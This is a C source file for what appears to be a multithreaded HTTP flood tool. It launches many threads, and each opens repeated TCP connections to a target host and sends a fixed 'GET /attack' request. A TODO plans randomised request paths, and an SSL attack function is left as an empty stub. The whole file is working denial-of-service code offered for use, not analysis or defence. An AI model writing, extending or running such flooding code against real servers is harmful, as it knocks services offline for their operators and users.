#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include <pthread.h>

#include "attacker.h"
#include "../color.h"


// Generates the payload to send to the server
static char *generate_payload() {
    // TODO Make payload be a random path instead of just "attack"
    return "GET /attack HTTP/1.1\nHost: \n\n";
}


// Sends the payload
static void send_payload(int sock_fd, char *payload) {
    if (payload == NULL) {
        payload = generate_payload();
    }
    write(sock_fd, payload, strlen(payload));
}

static void attack_with_ssl(char *host, char *ip, u_int16_t port, char *payload) {

}


// Does the request to the web server
static void attack(char *host, char *ip, uint16_t port, char *payload) {
    int sock_fd, i;
    struct sockaddr_in target_addr;

    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock_fd, (struct sockaddr *)&target_addr, sizeof target_addr)
        != 0) {
        return;
    }

    send_payload(sock_fd, payload);

    shutdown(sock_fd, SHUT_RDWR);
    close(sock_fd);
}


// Thread function that runs the attacks against some target
static void *run_attacks(void *args) {
    size_t i;
    struct thread_args *t_args;

    t_args = (struct thread_args *) args;
    for (i = 0; i < t_args->requests_per_thread; i++) {
        attack(t_args->host, t_args->ip, t_args->port, t_args->payload);
    }
}


// Run the threads
void run_threads(struct thread_args t_args) {
    size_t i;
    pthread_t t_id;
    pthread_t all_threads_id[NUM_THREADS];

    // run the threads
    for (i = 0; i < NUM_THREADS; i++) {
        printf( "\rrunning threads: %s%ld%s",
                LIGHT_RED, i+1, NO_COLOR);
        fflush(stdout);

        pthread_create(&t_id, NULL, run_attacks, (void *) &t_args);
        all_threads_id[i] = t_id; // append the thread id
        usleep(10 * 1000); // wait 10 milliseconds to run the next thread
    }
    printf("\nWaiting threads finish...\n");

    printf("\rcompleted threads: %s%d%s",
            LIGHT_BLUE, 0, NO_COLOR);
    fflush(stdout);
    // wait for threads to finish
    for (i = 0; i < NUM_THREADS; i++) {
        t_id = all_threads_id[i];
        pthread_join(t_id, NULL);

        printf("\rcompleted threads: %s%ld%s",
            LIGHT_BLUE, i+1, NO_COLOR);
        fflush(stdout);
    }
    printf("\n");
}
